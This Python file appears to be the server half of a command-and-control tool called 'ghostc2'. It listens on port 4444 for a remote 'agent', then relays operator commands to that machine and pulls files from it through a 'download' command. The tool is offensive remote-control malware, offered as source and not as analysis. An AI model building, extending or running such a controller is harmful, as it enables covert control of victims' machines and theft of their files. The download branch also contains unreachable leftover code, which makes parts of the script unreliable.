# vx_server.py
import socket
from modules import comms, file_transfer

def banner():
    print(r"""
       _               _       ____  
  __ _| |__   ___  ___| |_ ___|___ \ 
 / _` | '_ \ / _ \/ __| __/ __| __) |
| (_| | | | | (_) \__ \ || (__ / __/ 
 \__, |_| |_|\___/|___/\__\___|_____|
 |___/                               
""")

banner()

HOST, PORT = '0.0.0.0', 4444
server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

print("[+] Waiting for agent...")
client, addr = server.accept()
print(f"[+] Connection from {addr}")

# ─── Handshake ──────────────────────────────────────────────────────────
comms.rsend(client, "[VX_HELLO]", dtype="output")
resp = comms.rrecv(client)
if not resp or resp.get("payload") != "[VX_AGENT_READY]":
    print("[!] Agent failed handshake.")
    exit()

# ─── Main Loop ─────────────────────────────────────────────────────────
while True:
    cmd = input("\nghostc2> ").strip()
    if not cmd:
        continue

    # cd
    if cmd.startswith("cd "):
        comms.rsend(client, cmd, dtype="output")
        resp = comms.rrecv(client)
        if resp and resp["type"] == "output":
            print(f"[+] Changed directory to {resp['payload']}")
        else:
            msg = resp["payload"] if resp else "No response"
            print(f"[!] {msg}")
        continue

    # Exit
    if cmd == "exit":
        comms.rsend(client, cmd, dtype="output")
        break

    # Download
    if cmd.startswith("download "):
        # Use our file_transfer with progress
        file_transfer.receive(client, cmd, show_progress=True)
        continue
        resp = comms.rrecv(client)
        if not resp:
            print("[!] No response (agent disconnected?)")
            break

        if resp["type"] == "file":
            name = resp.get("filename", cmd.split(maxsplit=1)[1])
            raw = resp["payload"]           # this is bytes
            with open(name, "wb") as f:
                f.write(raw)
            print(f"[+] File saved as: {name}")
        else:
            # error or unexpected
            msg = resp.get("payload")
            print(f"[!] {msg}")
        continue

    #im tired bro pls someone contribute 🙏

    # Other commands
    comms.rsend(client, cmd, dtype="output")
    resp = comms.rrecv(client)
    if not resp:
        print("[!] No response (agent disconnected?)")
        break

    rtype = resp["type"]
    data  = resp["payload"]

    if rtype == "output":
        # decode bytes into string, leave string as-is
        if isinstance(data, (bytes, bytearray)):
            data = data.decode("utf-8", errors="ignore")
        print(data, end="")

    elif rtype == "error":
        if isinstance(data, (bytes, bytearray)):
            data = data.decode("utf-8", errors="ignore")
        print(f"[!] Agent error: {data}")

    else:
        print(f"[!] Unexpected response type: {rtype}")
